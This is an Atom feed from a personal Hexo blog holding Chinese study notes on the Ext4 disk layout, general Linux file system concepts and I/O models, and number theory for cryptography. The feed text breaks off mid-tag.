<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Strawberry Bear</title>
  
  
  <link href="https://youops.github.io/atom.xml" rel="self"/>
  
  <link href="https://youops.github.io/"/>
  <updated>2021-11-30T07:38:23.873Z</updated>
  <id>https://youops.github.io/</id>
  
  <author>
    <name>Youops</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://youops.github.io/2021/11/30/Ext4%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90/"/>
    <id>https://youops.github.io/2021/11/30/Ext4%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90/</id>
    <published>2021-11-30T07:38:23.873Z</published>
    <updated>2021-11-30T07:38:23.873Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ext4文件系统分析"><a href="#Ext4文件系统分析" class="headerlink" title="Ext4文件系统分析"></a>Ext4文件系统分析</h1><h2 id="Blocks（块）"><a href="#Blocks（块）" class="headerlink" title="Blocks（块）"></a>Blocks（块）</h2><p>ext4文件系统最基本的分配单元是block（块），block是由一组连续的sectors来组成，其大小介于1k-4k，当然不能是任意值，只能是2的整数次幂个sectors。然后连续的blocks再组成grop（块组), block的大小是在mkfs（在特定的分区建立文件系统）时指定的，默认是4K</p><p>默认情况下，系统可以包含2^32个blocks，如果开启“64bit”特性，可以支持2^64个blocks</p><h2 id="group-（块组）"><a href="#group-（块组）" class="headerlink" title="group （块组）"></a>group （块组）</h2><p>ext4文件系统的磁盘布局是先把磁盘分成一个个大小相同的block块（每个block的大小默认是4K），然后把这些block块合并成一个group。</p><p>group大小最大为128M（默认为128M），计算公式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Group_size = (blk_size*8)*blk_size=4096*8*4096= 32768*4096=128M</span><br></pre></td></tr></table></figure><p>对于一个块组结构：</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211129192616568.png" alt="image-20211129192616568" style="zoom:80%;"><p>块组组成：</p><p>![image-20211129180450564](/Users/apple/Library/Application Support/typora-user-images/image-20211129180450564.png)</p><ul><li><p>引导块：为磁盘分区的第一个块，记录文件系统分区的一些信息，引导加载当前分区的程序和数据被保存在这个块中。一般占用2kB。</p></li><li><p>超级块(super block):  超级块用于存储文件系统全局的配置参数(譬如：块大小，总的块数和inode数)和动态信息(譬如：当前空闲块数和inode数)，其处于文件系统开始位置的1k处，所占大小为1k。为了系统的健壮性，最初每个块组都有超级块和组描述符表(以下将用GDT)的一个拷贝，但是当文件系统很大时，这样浪费了很多块(尤其是GDT占用的块多)，后来采用了一种稀疏的方式来存储这些拷贝，只有块组号是3, 5 ,7的幂的块组(譬如说1,3,5,7,9,25,49…)才备份这个拷贝。通常情况下，只有主拷贝(第0块块组)的超级块信息被文件系统使用，其它拷贝只有在主拷贝被破坏的情况下才使用。</p></li><li><p>块组描述符表(GDT):  GDT用于存储块组描述符，其占用一个或者多个数据块，具体取决于文件系统的大小。它主要包含块位图，inode位图和inode表位置，当前空闲块数，inode数以及使用的目录数(用于平衡各个块组目录数)，具体定义可以参见ext3_fs.h文件中struct ext3_group_desc。每个块组都对应这样一个描述符，目前该结构占用32个字节，因此对于块大小为4k的文件系统来说，每个块可以存储128个块组描述符。由于GDT对于定位文件系统的元数据非常重要，因此和超级块一样，也对其进行了备份。GDT在每个块组(如果有备份)中内容都是一样的，其所占块数也是相同的。但是当文件系统很大时，这样浪费了很多块(尤其是GDT占用的块多)，后来采用了一种稀疏的方式来存储这些拷贝，详见元块组集（MetaGroup Blocks）</p></li><li><p>预留块组描述符表(Reserved GDT Blocks)：mkfs将在块组描述符表后面分配预留GDT表数据块以用于将来拓展文件系统</p></li><li><p>数据位图(Data Block Bitmap)和inode位图(inode Bitmap)： 表示对用的数据块或inode是否被使用</p></li><li><p>inode列表(inode Table) ：包含块组中所有的inode，inode用于保存文件系统中与各个文件和目录相关的所有元数据</p></li><li><p>数据块(Data Blocks) 包含文件的有用数据</p></li></ul><h2 id="磁盘布局"><a href="#磁盘布局" class="headerlink" title="磁盘布局"></a>磁盘布局</h2><p>一个Ext4文件系统被分成一系列块组。为减少磁盘碎片产生的性能瓶颈，块分配器尽量保持每个文件的数据块都在同一个块组中，从而减少寻道时间。</p><p>![image-20211130154655083](/Users/apple/Library/Application Support/typora-user-images/image-20211130154655083.png)</p><h2 id="Flexible块组（flex-bg）"><a href="#Flexible块组（flex-bg）" class="headerlink" title="Flexible块组（flex_bg）"></a>Flexible块组（flex_bg）</h2><p>几个块组在一起组成一个逻辑块组flex_bg。Flex_bg的第一个块组中的位图空间和inode空间包含了自身及其他块组的位图和inode表信息。</p><p>例如：flex_bg包含4个块组，块组0将顺序包含超级块、块组描述符表、<strong>块组0-3的数据块位图、块组0-3的inode位图、块组0-3的inode表</strong>，块组0中的其他空间用于存储文件数据。同时，其他块组的数据块位图、inode位图、inode表就不存在了，但是超级块和GDT存在。</p><p>![image-20211129184024607](/Users/apple/Library/Application Support/typora-user-images/image-20211129184024607.png)</p><p>Flexible块组的作用：</p><ul><li>聚集元数据，加速元数据载入</li><li>使得大文件在磁盘上尽量连续</li></ul><h2 id="元块组集（Meta-Block-Groups）"><a href="#元块组集（Meta-Block-Groups）" class="headerlink" title="元块组集（Meta Block Groups）"></a>元块组集（Meta Block Groups）</h2><p>如果不采用元块组集特性，在每个冗余备份的超级块的后面是一个完整的（包括所有块组描述符的）块组描述符表的备份。以Ext4的块组描述符大小64 Bytes计算,group最大为128M，即2^27 bytes，那么一个groups元数据有2^27/64=2^21个，文件系统中最多只能描述2^21个块组（2^21*2^27=2^48），也就是文件系统最大为256TB。</p><p>采用元块组集后，因为Ext4支持的是48bits block寻址方式，所以最大卷大小为2^48 个block，2^48*2^12=2^60B，而每个group为128M=2^27B，所以有2^60/2^27=2^33个group。</p><p>元块组实际上是可以用一个块组描述符块来进行描述的块组集，简单的说，它由一系列块组组成，同时这些块组对应的块组描述符存储在一个块中。对于block大小为4K的Ext4文件系统，一个元块组集包含64个块组。它的出现使得Ext3和Ext4的磁盘布局有了一定的变化，以往超级块后紧跟的是变长的GDT块，现在是超级块依然决定于是否是3,5,7的幂，而一个块组描述符块则存储在元块组的第一个，第二个和最后一个块组的开始处(见下图) </p><p>medablock group方案将存储在每个group 中第一个block中的group descriptor移动为medablock group为单位的第一个block group，冗余备份被放在了每个metadata block第二个和最后一个group中。</p><p>![image-20211130121710512](/Users/apple/Library/Application Support/typora-user-images/image-20211130121710512.png)</p><h2 id="延迟块组初始化"><a href="#延迟块组初始化" class="headerlink" title="延迟块组初始化"></a>延迟块组初始化</h2><p>ext4中有一个新特性，mkfs只初始化元块组集的3个GDT。INODE_UNINIT和BLOCK_UNINIT两个标识就代表block group中的inode Bitmap和Block Bitmap是可以计算的，因此bitmap block就不用进行初始化。 INODE_ZERO标识疑问这个inode table已经呗初始化了。该标识依赖后台内核进程初始化，mkfs并不会对该标识进行设置。</p><p>由于不用对bitmap、inode table进行写零初始化，因此mkfs的效率大大提升。</p><h2 id="特殊的inode"><a href="#特殊的inode" class="headerlink" title="特殊的inode"></a>特殊的inode</h2><p>Ext4预留了一些inode做特殊特性使用，见下表：</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211130153751465.png" alt="image-20211130153751465" style="zoom:80%;"><h2 id="Block和Inode分配策略"><a href="#Block和Inode分配策略" class="headerlink" title="Block和Inode分配策略"></a>Block和Inode分配策略</h2><p>对于机械磁盘（通常是指需要使用探针访问的那种），将相近相似、最近经常使用的数据存放在一起，这样就减少了在访问数据时磁头所需要移动的偏移量，进而能大幅度提升磁盘的IO性能；对于SSD来说，就不存在磁头所移动的偏移量了，但是「Data locality」（数据局限性）可以显著增加单次请求中的数据量，从而减少请求次数。而且「data locality」机制可以尽可能的集中擦写块、很好的控制分配空间的连续性，减少磁盘碎片。减少磁盘碎片的策略有以下几种：</p><ul><li>第一种用来减少磁盘碎片的方法就是multi-block分配。当一个文件首先被创建时，系统会自动的预分配一个8kb的空间，用于数据的存储；当文件被关闭时，没有被用到的预分配的空间也会被同时释放。</li><li>第二种是使用延时分配策略。当一个文件需要更多的空间时，文件系统决定延长分配空间的时间，直到所有的脏buffer要写入磁盘。除非必要(Timeout或sync或内核out of memory)，否则不写入磁盘。这样可以更好的对文件进行位置决策。</li><li>第三种是文件系统尽可能的把一个文件系统的数据和inode存放在同一个block group中，能够显著减少文件系统data寻址耗时。</li><li>第四种，整个卷被分割成大小为128M的groups。这样可以最大限度的保证数据局限性。然而，当在根目录创建文件时，inode分配器会扫描块组，从inode最空闲的group中分配inode空间。这种方式会扫描整个卷。但是一般而言都是按照顺序往下创建的。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ext4文件系统分析&quot;&gt;&lt;a href=&quot;#Ext4文件系统分析&quot; class=&quot;headerlink&quot; title=&quot;Ext4文件系统分析&quot;&gt;&lt;/a&gt;Ext4文件系统分析&lt;/h1&gt;&lt;h2 id=&quot;Blocks（块）&quot;&gt;&lt;a href=&quot;#Blocks（块）&quot; c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://youops.github.io/2021/11/23/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <id>https://youops.github.io/2021/11/23/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</id>
    <published>2021-11-23T07:15:14.506Z</published>
    <updated>2021-11-23T07:15:14.506Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><h2 id="文件系统的组成"><a href="#文件系统的组成" class="headerlink" title="文件系统的组成"></a>文件系统的组成</h2><h3 id="每个文件分配两个数据结构"><a href="#每个文件分配两个数据结构" class="headerlink" title="每个文件分配两个数据结构"></a>每个文件分配两个数据结构</h3><ul><li>索引节点（index node） 记录文件的元信息 ，比如 inode 编号、文件大小、访问权限、创建时间、修改时间、<strong>数据在磁盘的位置</strong>等等。</li><li>目录项(directory entry)  用于记录文件的名字、索引节点指针以及与其他目录项的层级关联关系。</li></ul><h3 id="目录与目录项的区别"><a href="#目录与目录项的区别" class="headerlink" title="目录与目录项的区别"></a>目录与目录项的区别</h3><ul><li>目录也是文件，用索引节点唯一标识，和普通文件不同的是，普通文件在次盘里保存的是文件数据，而目录文件在磁盘里面保存子目录或文件。</li><li>目录项是内核一个数据结构，缓存在内存。</li></ul><h3 id="文件数据在磁盘中的存储："><a href="#文件数据在磁盘中的存储：" class="headerlink" title="文件数据在磁盘中的存储："></a>文件数据在磁盘中的存储：</h3><ul><li>磁盘读写的最小扇区是512B大小，文件系统最小读写单位是逻辑块（数据块），Linux中的逻辑块是8个扇区。</li></ul><h3 id="索引节点、目录项、文件数据间的关系："><a href="#索引节点、目录项、文件数据间的关系：" class="headerlink" title="索引节点、目录项、文件数据间的关系："></a>索引节点、目录项、文件数据间的关系：</h3><p>![image-20211122164501080](/Users/apple/Library/Application Support/typora-user-images/image-20211122164501080.png)</p><p>​    磁盘进行格式化的时候，会被分成超级块、索引节点区和数据块区。我们不可能把超级块和索引节点区全部加载到内存，只有当需要使用的时候，才将其加载进内存，</p><ul><li>超级块 用来存储文件系统的详细信息，比如块个数、块大小、空闲块等等  当文件系统挂载时进入内存</li><li>索引节点区  用来存储索引节点 当文件被访问时进入内存</li><li>数据块区  用来存储文件或目录数据</li></ul><h2 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h2><p>文件系统的种类众多，而操作系统对用户提供统一的接口，于是在用户层与文件系统层引入了中间层，这个中间层称为虚拟文件系统（VFS）。</p><p>VFS定义了一组所有文件系统都支持的数据结构和标准接口，这样程序猿不需要了解文件系统的工作原理，只需要了解VFS提供的统一接口即可。</p><p>![image-20211122172943663](/Users/apple/Library/Application Support/typora-user-images/image-20211122172943663.png)</p><p>文件系统首先要挂载到某个目录才可以正常使用，比如Linux系统在启动时，会把文件系统挂载到根目录。</p><h2 id="文件的使用"><a href="#文件的使用" class="headerlink" title="文件的使用"></a>文件的使用</h2><p>我们打开文件后，操作系统会跟踪进程打开的所有文件。操作系统为每个进程维护一个打开文件表进行跟踪，文件表的每一项代表‘文件描述符’，所以说文件描述符是打开文件的标识。</p><p>``</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd = open(name, flag); # 打开文件  fd表示文件描述符</span><br><span class="line">...</span><br><span class="line">write(fd,...);         # 写数据</span><br><span class="line">...</span><br><span class="line">close(fd);             # 关闭文件</span><br></pre></td></tr></table></figure><p>操作系统在打开文件表中维护着打开文件的状态和信息：</p><ul><li><p>文件指针：系统跟踪上次读写位置作为当前文件位置指针，这种指针对打开文件的某个进程来说是唯一的。</p></li><li><p>文件打开计数器：文件关闭时，操作系统必须重用“打开文件表”条目，否则表内空间不够用。因为多个进程可能打开同一个文件，所以系统在删除打开文件条目之前，必须等待最后一个进程关闭文件，该进程打开和关闭的数量记为0时，系统关闭文件，删除该条目。</p></li><li><p>文件磁盘位置：绝大多数文件操作都要求系统修改文件数据，该信息保存在内存中，以免每个操作都从磁盘中读取</p></li><li><p>访问权限：每个进程打开都需要一个访问模式，该信息保存在进程的打开文件表中，以便操作系统能允许或拒绝之后的I/O请求</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211122210000743.png" style="zoom:70%;"></li></ul><p>文件系统的基本操作单位是数据块（逻辑块） 用户以字节的方式读写文件。</p><p>操作系统读写文件的过程：</p><ul><li>当用户进程从文件读取1字节大小的数据时，文件系统则需要获取字节所在的数据块，再返回数据块对应的用户进程所需要的数据部分，</li><li>当用户进程把1字节大小的数据写进文件时，文件系统则需要写入数据的数据块的位置，然后修改数据块中对用的部分，最后再把数据块写会磁盘。</li></ul><h2 id="文件存储"><a href="#文件存储" class="headerlink" title="文件存储"></a>文件存储</h2><h3 id="连续空间存储"><a href="#连续空间存储" class="headerlink" title="连续空间存储"></a>连续空间存储</h3><p>文件存放在磁盘中连续的物理空间中，因此需要提前知道文件的大小，文件系统才能根据文件大小在磁盘上找到一块连续的磁盘空间。所以，文件头里需要制定「起始块的位置」和「长度」。</p><p>注意，此处的文件头，类似于Linux的inode</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211122211228600.png" alt="image-20211122211228600" style="zoom:70%;"><h3 id="非连续空间存储"><a href="#非连续空间存储" class="headerlink" title="非连续空间存储"></a>非连续空间存储</h3><h4 id="链表方式"><a href="#链表方式" class="headerlink" title="链表方式"></a>链表方式</h4><ul><li><p>隐式链表：文件头包含「第一块」和「最后一块」的位置，并且每个数据块里面留出一个指针空间，用来存放下一个数据块的位置。只能顺序逐个查找</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211122212044083.png" style="zoom:80%;"></li><li><p>显示链接：把用于链接文件各数据块的指针，显示地存放在内存的一张链表（文件分配表）中，每个表象中存放链接指针，指向下一个数据块</p></li></ul><h4 id="索引方式"><a href="#索引方式" class="headerlink" title="索引方式"></a>索引方式</h4><p>索引的实现是为每个文件创建「索引数据块」，存放指向文件数据块的指针列表，文件头包含了只想索引数据块的指针。文件头知道索引数据块的位置，再通过索引数据块里的索引信息找到对应数据块。</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211122214252121.png" style="zoom:80%;"><h2 id="空闲空间管理"><a href="#空闲空间管理" class="headerlink" title="空闲空间管理"></a>空闲空间管理</h2><h3 id="空闲表法"><a href="#空闲表法" class="headerlink" title="空闲表法"></a>空闲表法</h3><p>为所有空闲空间建立一张空表，表内包括空闲区的第一个块号和空闲长度。</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211122222719978.png" alt="image-20211122222719978" style="zoom:80%;"><h3 id="空闲链表法"><a href="#空闲链表法" class="headerlink" title="空闲链表法"></a>空闲链表法</h3><p>使用「链表」的方式管理空闲空间</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211122223008348.png" alt="image-20211122223008348" style="zoom:80%;"><h3 id="位图法"><a href="#位图法" class="headerlink" title="位图法"></a>位图法</h3><p>利用二进制的一位来表示磁盘中的一个盘块的使用情况，磁盘上所有的盘块都有一个二进制与之对应。</p><p>当值为0时，表示对应的盘块空闲，值为1表示已经分配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1111110011111110001110110111111100111 ...</span><br></pre></td></tr></table></figure><p>在 Linux 文件系统就采用了位图的方式来管理空闲空间，不仅用于数据空闲块的管理，还用于 inode 空闲块的管理，因为 inode 也是存储在磁盘的，自然也要有对其管理。</p><h2 id="文件系统的结构"><a href="#文件系统的结构" class="headerlink" title="文件系统的结构"></a>文件系统的结构</h2><p>Linux是用位图的方式管理空闲空间，内核通过inode的位图找到可用的inode并进行分配。其中存位图的二进制的块称为块组。</p><p>下图给出了 Linux Ext2 整个文件系统的结构和块组的内容，文件系统都由大量块组组成，在硬盘上相继排布：</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211122225152927.png" alt="image-20211122225152927" style="zoom:80%;"><p>引导块：在系统启动时用于启用引导，后面接着连续的块组。</p><p>块组组成：</p><ul><li>超级块 包含文件系统的重要信息，比如inode总个数、块总个数、每个块组的inode个数</li><li>块组描述符表 包含文件系统中各个块组的状态 如块组中空闲块的个数</li><li>数据位图和inode位图： 表示对用的数据块或inode是否被使用</li><li>inode列表 包含块组中所有的inode，inode用于保存文件系统中与各个文件和目录相关的所有元数据</li><li>数据块 包含文件的有用数据</li></ul><p><strong>超级块和块组描述符表，这两个都是全局信息，而且非常的重要</strong>，这么做是有两个原因： - 如果系统崩溃破坏了超级块或块组描述符，有关文件系统结构和内容的所有信息都会丢失。</p><h2 id="目录的存储"><a href="#目录的存储" class="headerlink" title="目录的存储"></a>目录的存储</h2><p>目录也是文件，与普通文件不同的是，普通文件的块里面保存的是文件数据，而目录文件的块保存的是目录里一项一项的文件信息。</p><p>在目录文件中，最简单的保存格式是列表，就是将目录下的文件信息保存在表里。</p><p>列表中每一项都代表该项目下的文件的文件名和对应的inode，通过这个inode可以找到真正的文件，</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211122233305120.png" alt="image-20211122233305120" style="zoom:80%;"><p>通常，第一项「.」表示当前目录，第二项「..」表示上一级目录，接下来是一项一项的文件名和inode</p><p>若文件很多时，对文件名取哈希计算，把哈希值保存起来，如果我们要查找一个目录下面的文件名，可以通过名称取哈希。查找对应哈希值。</p><h2 id="软链接和硬链接"><a href="#软链接和硬链接" class="headerlink" title="软链接和硬链接"></a>软链接和硬链接</h2><p>Linux通过硬链接和软链接的方式实现给某个文件取别名。</p><p>硬链接是多个目录项中的「索引节点」指向文件，也就是指向同一个inode，但是inode是不可能跨越文件系统的，每个文件系统都有各自的inode数据结构和列表，所以硬链接是不可用于跨文件系统的。由于多个目录项都是指向一个inode，那么只有删除文件的所有硬链接以及源文件时，系统才会彻底删除该文件。</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211123112905656.png" alt="image-20211123112905656" style="zoom:80%;"><p>软链接相当于重新创建一个文件，这个文件有独立的inode，但是这个文件的内容是另外一个文件的路径，所以访问软链接的时候，实际上相当于访问到了另外一个文件，所以软链接是可以跨文件系统的，甚至目标文件被删除了，链接文件还是在的，只不过文件找不到了而已。</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211123113644517.png" alt="image-20211123113644517" style="zoom:80%;"><h2 id="文件I-O"><a href="#文件I-O" class="headerlink" title="文件I/O"></a>文件I/O</h2><h3 id="缓冲与非缓冲I-O"><a href="#缓冲与非缓冲I-O" class="headerlink" title="缓冲与非缓冲I/O"></a>缓冲与非缓冲I/O</h3><p>文件操作的标准库是可以实现数据的缓存，那么根据「是否利用标准库缓冲」，可以把文件I/O分为缓冲I/O和非缓冲I/O：</p><ul><li>缓冲I/O，利用的是标准库的缓存实现文件的加速访问，而标准库再通过系统调用访问文件</li><li>非缓冲I/O，直接通过系统调用访问文件，不用经过标准库缓存。</li></ul><p>很多程序遇到换行时才真正输出，而换行前的内容其实就是被标准库暂时缓存了起来，这样做的目的是减少系统调用的次数，减小CPU上下文切换的开销</p><h3 id="直接与非直接I-O"><a href="#直接与非直接I-O" class="headerlink" title="直接与非直接I/O"></a>直接与非直接I/O</h3><p>磁盘I/O很慢，Linux内核为了减少磁盘I/O次数，在系统调用后，会把用户数据拷贝到内核中缓存起来，这个内核缓存空间称为「页缓存」，只有当缓存满足某些条件的时候，才发起磁盘I/O请求</p><p>根据「是否利用操作系统的缓存」，可以把文件I/O分为直接I/O与非直接I/O：</p><ul><li>直接I/O：不会发生内核缓存和用户程序之间数据的肤质，而是直接经过文件系统访问磁盘。</li><li>非直接I/O：读操作是，数据从内核缓存中拷贝给用户程序，写操作时，用户从用户程序拷贝给内核缓存，再由内核决定什么时候刺蛾入数据到磁盘。</li></ul><p>若在使用文件操作类的系统调用函数时，指定了O_DIRECT标志，则表示使用I/O。否则使用非直接I/O</p><p>以下几种场景会触发内核缓存的数据写入磁盘：</p><ul><li>在调用write的最后，当发现内核缓存的数据太多的时候，内核会把数据写到磁盘上</li><li>用户主动调用sync，内核缓存会刷到磁盘上</li><li>当内存十分紧张，无法再分配页面是，也会把内核缓存的数据刷到磁盘上</li><li>内核缓存的数据的缓存时间超过某个时间时，也会把数据刷到磁盘上</li></ul><h3 id="阻塞与非阻塞-VS-同步与异步"><a href="#阻塞与非阻塞-VS-同步与异步" class="headerlink" title="阻塞与非阻塞 VS 同步与异步"></a>阻塞与非阻塞 VS 同步与异步</h3><p><strong>阻塞I/O</strong>，当用户程序执行read，线程会被阻塞，一直等到内核数据准备好，并把数据从内核缓冲区拷贝到应用程序缓冲区中，当拷贝完成时，read才会返回。</p><p>阻塞等待的是「内核数据准备好」和「数据从内核态拷贝到用户态」这两个过程</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211123144134911.png" alt="image-20211123144134911" style="zoom:30%;"><p><strong>非阻塞I/O</strong>,非阻塞的read请求在数据未准备好的情况下立即返回，可以继续往下执行，此时应用程序不断轮询内核，直到数据准备好，<strong>read进行系统调用</strong>后内核将数据拷贝到应用程序缓冲区，*才可以获取到结果</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211123153928227.png" alt="image-20211123153928227" style="zoom:60%;"><p>注意，这里最后一次read调用，获取数据的过程是一个同步的过程，是需要等待的过程。这里的同步指的是内核态的数据拷贝到用户程序的缓存区这个过程。</p><p>I**/O多路复用**，替代轮询内核的方式。它是通过I/O事件分发，当内核数据准备好时，再以事件通知应用程序进行操作。在没有被通知的情况下，应用进程可以使用CPU做其他的事情。</p><p>下图是使用select I/O多路复用过程。注意，read获取数据的过程（数据从内核态拷贝到用户态的过程），也是一个同步的过程，需要等待。</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211123153958979.png" alt="image-20211123153958979" style="zoom:67%;"><p>实际上，无论是阻塞I/O、非阻塞I/O都是同步调用。因为他们在read调用时，内核将数据从内核空间拷贝到应用程序空间的过程都需要等待，也就是说这个过程是同步的。如果内核实现的拷贝效率不高，read调用就会在这个同步过程中等待比较长的时间，</p><p>而真正的<strong>异步I/O</strong>是「内核数据准备好」和「数据从内核态拷贝到用户态」这两个过程都不用等待。</p><p>当我们发起aio_read之后，就立即返回，内核自动完成的，应用程序并不需要主动发起拷贝动作（read发起系统调用），过程如下图：</p><img src="/Users/apple/Library/Application Support/typora-user-images/image-20211123154029407.png" alt="image-20211123154029407" style="zoom:67%;">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件系统&quot;&gt;&lt;a href=&quot;#文件系统&quot; class=&quot;headerlink&quot; title=&quot;文件系统&quot;&gt;&lt;/a&gt;文件系统&lt;/h1&gt;&lt;h2 id=&quot;文件系统的组成&quot;&gt;&lt;a href=&quot;#文件系统的组成&quot; class=&quot;headerlink&quot; title=&quot;文件系</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://youops.github.io/2021/11/17/Linux%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <id>https://youops.github.io/2021/11/17/Linux%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</id>
    <published>2021-11-17T10:55:21.641Z</published>
    <updated>2021-11-17T10:55:21.641Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux中的文件系统"><a href="#Linux中的文件系统" class="headerlink" title="Linux中的文件系统"></a>Linux中的文件系统</h1><h2 id="Btrfs"><a href="#Btrfs" class="headerlink" title="Btrfs"></a>Btrfs</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux中的文件系统&quot;&gt;&lt;a href=&quot;#Linux中的文件系统&quot; class=&quot;headerlink&quot; title=&quot;Linux中的文件系统&quot;&gt;&lt;/a&gt;Linux中的文件系统&lt;/h1&gt;&lt;h2 id=&quot;Btrfs&quot;&gt;&lt;a href=&quot;#Btrfs&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://youops.github.io/2021/11/04/%E6%95%B0%E8%AE%BA-%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <id>https://youops.github.io/2021/11/04/%E6%95%B0%E8%AE%BA-%E5%AF%86%E7%A0%81%E5%AD%A6/</id>
    <published>2021-11-04T06:44:58.278Z</published>
    <updated>2021-11-04T06:44:58.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="最大公约数-gcd-a-b"><a href="#最大公约数-gcd-a-b" class="headerlink" title="最大公约数 gcd(a,b)"></a>最大公约数 gcd(a,b)</h2><ul><li><h3 id="欧几里得算法-a-b-d-r-gcd-a-b-gcd-b-r"><a href="#欧几里得算法-a-b-d-r-gcd-a-b-gcd-b-r" class="headerlink" title="欧几里得算法  a=b*d+r gcd(a, b) = gcd(b, r)"></a>欧几里得算法  a=b*d+r gcd(a, b) = gcd(b, r)</h3></li><li><h3 id="互素-gcd（a，b）-1-两个数互素，他们之间不一定存在素数"><a href="#互素-gcd（a，b）-1-两个数互素，他们之间不一定存在素数" class="headerlink" title="互素 gcd（a，b）=1 两个数互素，他们之间不一定存在素数"></a>互素 gcd（a，b）=1 两个数互素，他们之间不一定存在素数</h3></li></ul><h2 id="最小公倍数-lcm-a-b"><a href="#最小公倍数-lcm-a-b" class="headerlink" title="最小公倍数 lcm(a,b)"></a>最小公倍数 lcm(a,b)</h2><ul><li><h3 id="lcm-a-b-两者取最小，反复加自己，相等时停止"><a href="#lcm-a-b-两者取最小，反复加自己，相等时停止" class="headerlink" title="lcm(a,b) 两者取最小，反复加自己，相等时停止"></a>lcm(a,b) 两者取最小，反复加自己，相等时停止</h3></li></ul><h2 id="模运算-a-mod-n-r"><a href="#模运算-a-mod-n-r" class="headerlink" title="模运算 a mod n = r"></a>模运算 a mod n = r</h2><ul><li><h3 id="乘法链算法-a-m-mod-n-把m看成质数和-a-25-mod-n-a-16-8-1-a-11001"><a href="#乘法链算法-a-m-mod-n-把m看成质数和-a-25-mod-n-a-16-8-1-a-11001" class="headerlink" title="乘法链算法  a^m mod n 把m看成质数和 a^25 mod n =a^(16+8+1)  = a^(11001)"></a>乘法链算法  a^m mod n 把m看成质数和 a^25 mod n =a^(16+8+1)  = a^(11001)</h3></li></ul><p>![F5514F45-016E-4DF2-B585-1D1A6B6934C6](/Users/apple/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1213531141/QQ/Temp.db/F5514F45-016E-4DF2-B585-1D1A6B6934C6.png)</p><h2 id="欧拉函数-fai-n"><a href="#欧拉函数-fai-n" class="headerlink" title="欧拉函数 fai(n)"></a>欧拉函数 fai(n)</h2><ul><li>小于等于n且与n互素的正整数的个数</li><li>性质：若p、q都是素数 fai (p)= p-1    fai (pxq) = fai (p) fai (q)=(p-1)(q-1)</li><li>定理：若p为素数，k为正整数，则fai (p^k) = (p^(k-1))(p-1) </li><li>若gcd(a, b) = 1, 则 fai (ab) = fai (a) fai (b)</li></ul><h2 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h2><ul><li><p>![F47C4056-FBF0-4390-9FC7-8A8ADAB57EFD](/Users/apple/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1213531141/QQ/Temp.db/F47C4056-FBF0-4390-9FC7-8A8ADAB57EFD.png)</p></li><li><p>![9903485F-6B99-4C2A-B05A-B0EB25673DEE](/Users/apple/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1213531141/QQ/Temp.db/9903485F-6B99-4C2A-B05A-B0EB25673DEE.png)</p></li></ul><h2 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h2><p>![567F0216-73CE-49EB-8B5E-288CB8D3B585](/Users/apple/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1213531141/QQ/Temp.db/567F0216-73CE-49EB-8B5E-288CB8D3B585.png)</p><p>![ABCA7548-80BC-4570-ACC2-6D5D7A3CF592](/Users/apple/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1213531141/QQ/Temp.db/ABCA7548-80BC-4570-ACC2-6D5D7A3CF592.png)</p><h2 id="二次剩余"><a href="#二次剩余" class="headerlink" 